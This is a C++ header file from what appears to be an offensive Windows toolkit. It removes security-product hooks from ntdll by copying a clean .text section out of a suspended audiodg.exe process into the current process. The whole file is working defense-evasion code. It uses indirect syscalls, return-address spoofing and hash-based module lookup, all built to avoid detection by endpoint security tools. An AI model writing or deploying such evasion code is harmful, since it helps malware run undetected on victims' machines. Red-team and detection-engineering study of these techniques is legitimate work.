// This header file uses indirect syscalls to unhook ntdll from a suspended process


#pragma once



#include "functions.h"
#include "resolvers.h"
#include "ntprocessapi.h"
#include "retaddrspoof.h"


extern PVOID Gdgt;

DWORD GetImageSizeFromBase() {

	HMODULE BASE = GetLoadedDllHandleH(776560387); // Getting NTDLL BASE By Hash
	uintptr_t base = reinterpret_cast<uintptr_t>(BASE);

	PIMAGE_DOS_HEADER pdos = (PIMAGE_DOS_HEADER)base;

	if (pdos->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cout << "IMAGE_DOS_SIGNATURE MISMATCH\n";
		return NULL;
	}

	PIMAGE_NT_HEADERS pntheaders = (PIMAGE_NT_HEADERS)(pdos->e_lfanew + base); // getting the nt headers using its rva

	if (pntheaders->Signature != IMAGE_NT_SIGNATURE) {
		std::cout << "IMAGE_NT_SIGNATURE MISMATCH\n";
		return NULL;
	}

	return pntheaders->OptionalHeader.SizeOfImage;
}

VOID ReadBufferFromProcess(OUT PBYTE* BUFFER) {
	DWORD sizeofheap = GetImageSizeFromBase();
	HMODULE BASE = GetLoadedDllHandleH(776560387);

	// Temporarily Create a process

	HANDLE hProcess = nullptr;
	HANDLE hThread = nullptr;

	NTSTATUS status = NtCreateUserSuspendedProcess(L"\\??\\C:\\Windows\\System32\\audiodg.exe", &hProcess, &hThread);
	if (status != ERROR_SUCCESS || hProcess == NULL || hProcess == INVALID_HANDLE_VALUE || hThread == NULL || hThread == INVALID_HANDLE_VALUE) { // gotta be sure tho xD
		std::cout << "Process Creation Error: " << std::hex << status << "\n";
	}
	
	PBYTE bufferMemory = (PBYTE)malloc((SIZE_T)sizeofheap);
	RtlSecureZeroMemory(bufferMemory, sizeofheap);
	SIZE_T lpNumberOfBytesRead = 0;

	status = (NTSTATUS)RetSpoofCall(SysNtReadVirtualMemory, 5, Gdgt, hProcess, BASE, bufferMemory, sizeofheap, &lpNumberOfBytesRead);
	
	if (status != ERROR_SUCCESS) {
		std::cout << "Read Error: " << std::hex << status << "\n";
	}

	*BUFFER = bufferMemory;

	//free(bufferMemory);
	// status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)SysNtTerminateProcess, 2, Gdgt, hProcess, 0));
	status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)SysNtTerminateProcess, 2, Gdgt, hProcess, 0));
	
	if (status != ERROR_SUCCESS) {
		std::cout << "Termination Error: " << std::hex << status << "\n";
	}
}

/// <summary>
/// Perfomes NTDLL unhooking from a suspended process using return address spoofing and indirect syscalls
/// </summary>
/// <returns></returns>
VOID FlushNTDLL() {

	PVOID LOCAL_SECTION = NULL,
		REMOTE_SECTION = NULL;
	SIZE_T SECTION_SIZE;


	PBYTE clean_buffer = nullptr;
	ReadBufferFromProcess(&clean_buffer);

	HMODULE BASE = GetLoadedDllHandleH(776560387);
	uintptr_t base = reinterpret_cast<uintptr_t>(BASE);

	PIMAGE_DOS_HEADER pdos = (PIMAGE_DOS_HEADER)base;

	if (pdos->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cout << "IMAGE_DOS_SIGNATURE MISMATCH\n";
		return;
	}

	PIMAGE_NT_HEADERS pntheaders = (PIMAGE_NT_HEADERS)(pdos->e_lfanew + base); // getting the nt headers using its rva

	if (pntheaders->Signature != IMAGE_NT_SIGNATURE) {
		std::cout << "IMAGE_NT_SIGNATURE MISMATCH\n";
		return;
	}


	PIMAGE_SECTION_HEADER SECTIONS_ENTRY = IMAGE_FIRST_SECTION(pntheaders);

	for (int i = 0; i < pntheaders->FileHeader.NumberOfSections; i++) {
		//std::cout << (CHAR*)SECTIONS_ENTRY[i].Name << std::endl;

		if (strcmp((CHAR*)SECTIONS_ENTRY[i].Name, ".text") == 0) {
			LOCAL_SECTION = (PVOID)(base + SECTIONS_ENTRY[i].VirtualAddress);
			REMOTE_SECTION = (PVOID)(clean_buffer + SECTIONS_ENTRY[i].VirtualAddress);
			SECTION_SIZE = SECTIONS_ENTRY[i].Misc.VirtualSize;
		}
	}

	DWORD old_protect;


	NTSTATUS status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)SysNtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &LOCAL_SECTION, &SECTION_SIZE, PAGE_EXECUTE_WRITECOPY, &old_protect));

	if (status != ERROR_SUCCESS) { std::cout << "Protection 1 Error: " << std::hex << status << "\n"; return; }

	RetSpoofCall((void*)memcpy, 3, Gdgt ,LOCAL_SECTION, REMOTE_SECTION, (SIZE_T)SECTION_SIZE);

	status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)SysNtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &LOCAL_SECTION, &SECTION_SIZE, old_protect, &old_protect));

	if (status != ERROR_SUCCESS) { std::cout << "Protection 2 Error: " << std::hex << status << "\n"; return; }


#ifdef _DEBUG_PRINT

	std::cout << "[DEBUG] UNHOOKED NTDLL!\n";

#endif

	delete[] clean_buffer;
	return;
}
